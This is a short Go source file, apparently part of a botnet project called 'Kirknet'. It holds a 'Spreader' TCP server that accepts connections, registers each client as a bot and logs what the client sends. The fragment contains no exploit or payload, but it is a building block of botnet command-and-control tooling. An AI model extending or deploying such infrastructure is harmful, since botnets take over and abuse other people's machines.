package main

import (
	"fmt"
	"log"
	"net"
)

func Spreader() {
	listener, err := net.Listen(Options.Kirknet.Spreader.Protocol, Options.Kirknet.Spreader.Port)
	if err != nil {
		log.Fatalf("Error: %v\\r\\n", err)
	}

	log.Println("Spreader server port: " + Options.Kirknet.Spreader.Port)

	for {
		connection, err := listener.Accept()
		if err != nil {
			continue
		}
		go Handler(connection)
	}
}

func Handler(connection net.Conn) {
	defer connection.Close()
	defer removeBot(connection)
	addBot(connection)
	fmt.Println("[+] Client connected")

	buffer := make([]byte, 32)
	for {
		n, err := connection.Read(buffer)
		if err != nil {
			break
		}
		fmt.Printf("Received: %s", string(buffer[:n]))
	}

	fmt.Println("[-] Client disconnected")
}
